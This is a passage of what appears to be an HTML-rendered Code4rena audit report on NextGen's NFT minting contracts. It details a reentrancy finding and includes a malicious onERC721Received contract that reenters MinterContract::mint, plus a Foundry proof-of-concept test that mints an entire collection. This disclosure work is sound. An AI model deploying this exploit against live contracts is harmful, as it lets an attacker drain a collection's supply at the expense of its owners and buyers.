href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/1580\">2</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/1238\">3</a>), <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/1808\">ChrisTina</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/1803\">Tricko</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/1795\">DarkTower</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/1742\">DeFiHackLabs</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/1708\">immeas</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/1700\">Aymen0909</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/1694\">sces60107</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/1660\">phoenixV110</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/1635\">0xraion</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/1626\">0x175</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/1448\">trachev</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/1445\">3th</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/1440\">droptpackets</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/1380\">Talfao</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/1377\">0xJuda</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/1367\">r0ck3tz</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/1343\">smiling_heretic</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/1330\">stackachu</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/1270\">seeques</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/1154\">MrPotatoMagic</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/1147\">codynhat</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/1128\">audityourcontracts</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/1114\">ustas</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/1104\">jacopod</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/1076\">Neo_Granicen</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/1065\">bronze_pickaxe</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/993\">PENGUN</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/980\">bird-flu</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/961\">EricWWFCP</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/757\">ke1caM</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/753\">Viktor_Cortess</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/742\">The_Kakers</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/691\">fibonacci</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/638\">ayden</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/557\">Al-Qa-qa</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/538\">0xpiken</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/406\">xAriextz</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/398\">ubl4nk</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/367\">_eperezok</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/337\">degensec</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/272\">flacko</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/188\">evmboi32</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/58\">kk_krish</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/51\">ZdravkoHr</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/2050\">gumgumzum</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/2039\">turvy_fuzz</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/1469\">Toshii</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/1449\">mojito_auditor</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/1392\">SovaSlava</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/1318\">AvantGard</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/1206\">00xSEV</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/1186\">xuwinnie</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/1057\">SpicyMeatball</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/953\">Kow</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/902\">KupiaSec</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/850\">VAD37</a>, 0xAlix2 (<a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/724\">1</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/718\">2</a>), <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/555\">Ruhum</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/396\">0x180db</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/192\">0x3b</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/186\">t0x1c</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/59\">Beosin</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/43\">critical-or-high</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/1828\">innertia</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/1529\">nuthan2x</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/1022\">joesan</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/775\">danielles0xG</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/648\">Soul22</a>, and <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/528\">y4y</a></em></p>\n<p>An attacker can reenter the <code>MinterContract::mint</code> function, bypassing the <code>maxCollectionPurchases</code> check and minting the entire collection supply.</p>\n<h3 id=\"proof-of-concept\" style=\"position:relative;\"><a href=\"#proof-of-concept\" aria-label=\"proof of concept permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p>The vulnerability stems from the absence of the <a href=\"https://fravoll.github.io/solidity-patterns/checks_effects_interactions.html\">Check Effects Interactions</a> pattern. As seen here, <code>NextGenCore::mint</code> updates the <code>tokensMintedAllowlistAddress</code> and <code>tokensMintedPerAddress</code> after making an external call:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"0\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// Minting logic is here</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">phase</span><span class=\"mtk1\"> == </span><span class=\"mtk7\">1</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">tokensMintedAllowlistAddress</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_collectionID</span><span class=\"mtk1\">][</span><span class=\"mtk12\">_mintingAddress</span><span class=\"mtk1\">]++;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    } </span><span class=\"mtk15\">else</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">tokensMintedPerAddress</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_collectionID</span><span class=\"mtk1\">][</span><span class=\"mtk12\">_mintingAddress</span><span class=\"mtk1\">]++;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">}</span></span></span></code></pre>\n<h3 id=\"exploitation-steps\" style=\"position:relative;\"><a href=\"#exploitation-steps\" aria-label=\"exploitation steps permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Exploitation Steps:</h3>\n<ul>\n<li>Attacker calls <code>MinterContract::mint</code> with a malicious contract as the receiver.</li>\n<li>The malicious contract executes a crafted <code>onERC721Received()</code>.</li>\n<li><code>MinterContract::mint</code> invokes <code>NextGenCore::mint</code>, which uses <code>_safeMint()</code> internally.</li>\n<li><code>_safeMint()</code> calls <code>_recipient.onERC721Received()</code>, leading to the minting of the complete collection supply.</li>\n</ul>\n<h3 id=\"an-example-of-the-attacker-onerc721received-implementation\" style=\"position:relative;\"><a href=\"#an-example-of-the-attacker-onerc721received-implementation\" aria-label=\"an example of the attacker onerc721received implementation permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>An example of the attacker <code>onERC721Received()</code> implementation:</h3>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"1\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">onERC721Received</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">address</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">address</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">bytes</span><span class=\"mtk1\"> </span><span class=\"mtk12\">memory</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    ) </span><span class=\"mtk11\">public</span><span class=\"mtk1\"> </span><span class=\"mtk11\">override</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">bytes4</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        (, , </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">circulationSupply</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">totalSupply</span><span class=\"mtk1\">, , ) = </span><span class=\"mtk12\">nextGenCore</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            .</span><span class=\"mtk11\">retrieveCollectionAdditionalData</span><span class=\"mtk1\">(</span><span class=\"mtk7\">1</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">circulationSupply</span><span class=\"mtk1\"> == </span><span class=\"mtk12\">totalSupply</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk15\">return</span><span class=\"mtk1\"> </span><span class=\"mtk4\">this</span><span class=\"mtk1\">.</span><span class=\"mtk12\">onERC721Received</span><span class=\"mtk1\">.</span><span class=\"mtk12\">selector</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">bytes32</span><span class=\"mtk1\">[] </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">merkleProof</span><span class=\"mtk1\"> = </span><span class=\"mtk4\">new</span><span class=\"mtk1\"> </span><span class=\"mtk10\">bytes32</span><span class=\"mtk1\">[](</span><span class=\"mtk7\">1</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">merkleProof</span><span class=\"mtk1\">[</span><span class=\"mtk7\">0</span><span class=\"mtk1\">] = </span><span class=\"mtk11\">bytes32</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">minterContract</span><span class=\"mtk1\">.</span><span class=\"mtk12\">mint</span><span class=\"mtk1\">{value: </span><span class=\"mtk7\">1e18</span><span class=\"mtk1\">}({</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">_collectionID:</span><span class=\"mtk1\"> </span><span class=\"mtk7\">1</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">_numberOfTokens:</span><span class=\"mtk1\"> </span><span class=\"mtk7\">1</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">_maxAllowance:</span><span class=\"mtk1\"> </span><span class=\"mtk7\">0</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">_tokenData:</span><span class=\"mtk1\"> </span><span class=\"mtk8\">&quot;&quot;</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">_mintTo:</span><span class=\"mtk1\"> </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk4\">this</span><span class=\"mtk1\">),</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">merkleProof:</span><span class=\"mtk1\"> </span><span class=\"mtk12\">merkleProof</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">_delegator:</span><span class=\"mtk1\"> </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0</span><span class=\"mtk1\">),</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">_saltfun_o:</span><span class=\"mtk1\"> </span><span class=\"mtk7\">0</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        });</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">return</span><span class=\"mtk1\"> </span><span class=\"mtk4\">this</span><span class=\"mtk1\">.</span><span class=\"mtk12\">onERC721Received</span><span class=\"mtk1\">.</span><span class=\"mtk12\">selector</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span></code></pre>\n<h3 id=\"here-is-a-coded-poc-to-demonstrate-the-issue\" style=\"position:relative;\"><a href=\"#here-is-a-coded-poc-to-demonstrate-the-issue\" aria-label=\"here is a coded poc to demonstrate the issue permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Here is a coded PoC to demonstrate the issue:</h3>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"2\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">testMintAllTheCollection</span><span class=\"mtk1\">() </span><span class=\"mtk11\">public</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">bytes32</span><span class=\"mtk1\">[] </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">merkleProof</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">setUpArrayBytes</span><span class=\"mtk1\">(</span><span class=\"mtk7\">1</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">merkleProof</span><span class=\"mtk1\">[</span><span class=\"mtk7\">0</span><span class=\"mtk1\">] = </span><span class=\"mtk11\">bytes32</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">attacker</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">makeAddr</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;attacker&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">prank</span><span class=\"mtk1\">(</span><span class=\"mtk12\">attacker</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">MintAllSupply</span><span class=\"mtk1\"> </span><span class=\"mtk12\">mintAllSupply</span><span class=\"mtk1\"> = </span><span class=\"mtk4\">new</span><span class=\"mtk1\"> </span><span class=\"mtk10\">MintAllSupply</span><span class=\"mtk1\">(</span><span class=\"mtk12\">minterContract</span><span class=\"mtk1\">, </span><span class=\"mtk12\">nextGenCore</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">deal</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">mintAllSupply</span><span class=\"mtk1\">), </span><span class=\"mtk7\">49e18</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">warp</span><span class=\"mtk1\">(</span><span class=\"mtk12\">block</span><span class=\"mtk1\">.</span><span class=\"mtk12\">timestamp</span><span class=\"mtk1\"> + </span><span class=\"mtk7\">1</span><span class=\"mtk1\"> </span><span class=\"mtk12\">days</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk10\">console</span><span class=\"mtk1\">.</span><span class=\"mtk11\">log</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;(Collection Circulation Supply Before)      = &quot;</span><span class=\"mtk1\">, </span><span class=\"mtk12\">nextGenCore</span><span class=\"mtk1\">.</span><span class=\"mtk11\">viewCirSupply</span><span class=\"mtk1\">(</span><span class=\"mtk7\">1</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk10\">console</span><span class=\"mtk1\">.</span><span class=\"mtk11\">log</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;(Balance of attacker contract Before)       = &quot;</span><span class=\"mtk1\">, </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">mintAllSupply</span><span class=\"mtk1\">).</span><span class=\"mtk12\">balance</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk10\">console</span><span class=\"mtk1\">.</span><span class=\"mtk11\">log</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;(Col 1 Balance of attacker contract Before) = &quot;</span><span class=\"mtk1\">, </span><span class=\"mtk12\">nextGenCore</span><span class=\"mtk1\">.</span><span class=\"mtk11\">balanceOf</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">mintAllSupply</span><span class=\"mtk1\">)));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">hoax</span><span class=\"mtk1\">(</span><span class=\"mtk12\">attacker</span><span class=\"mtk1\">, </span><span class=\"mtk7\">1e18</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">minterContract</span><span class=\"mtk1\">.</span><span class=\"mtk12\">mint</span><span class=\"mtk1\">{ value: </span><span class=\"mtk7\">1e18</span><span class=\"mtk1\">}({</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">_collectionID:</span><span class=\"mtk1\"> </span><span class=\"mtk7\">1</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">_numberOfTokens:</span><span class=\"mtk1\"> </span><span class=\"mtk7\">1</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">_maxAllowance:</span><span class=\"mtk1\"> </span><span class=\"mtk7\">0</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">_tokenData:</span><span class=\"mtk1\"> </span><span class=\"mtk8\">&quot;&quot;</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">_mintTo:</span><span class=\"mtk1\"> </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">mintAllSupply</span><span class=\"mtk1\">),</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">merkleProof:</span><span class=\"mtk1\"> </span><span class=\"mtk12\">merkleProof</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">_delegator:</span><span class=\"mtk1\"> </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0</span><span class=\"mtk1\">),</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">_saltfun_o:</span><span class=\"mtk1\"> </span><span class=\"mtk7\">0</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        });</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk10\">console</span><span class=\"mtk1\">.</span><span class=\"mtk11\">log</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;(Collection Circulation Supply After)       = &quot;</span><span class=\"mtk1\">, </span><span class=\"mtk12\">nextGenCore</span><span class=\"mtk1\">.</span><span class=\"mtk11\">viewCirSupply</span><span class=\"mtk1\">(</span><span class=\"mtk7\">1</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk10\">console</span><span class=\"mtk1\">.</span><span class=\"mtk11\">log</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;(Balance of attacker contract After)        = &quot;</span><span class=\"mtk1\">, </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">mintAllSupply</span><span class=\"mtk1\">).</span><span class=\"mtk12\">balance</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk10\">console</span><span class=\"mtk1\">.</span><span class=\"mtk11\">log</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;(Col 1 Balance of attacker contract After)  = &quot;</span><span class=\"mtk1\">, </span><span class=\"mtk12\">nextGenCore</span><span class=\"mtk1\">.</span><span class=\"mtk11\">balanceOf</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">mintAllSupply</span><span class=\"mtk1\">)));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span></code></pre>\n<h3 id=\"logs-result\" style=\"position:relative;\"><a href=\"#logs-result\" aria-label=\"logs result permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 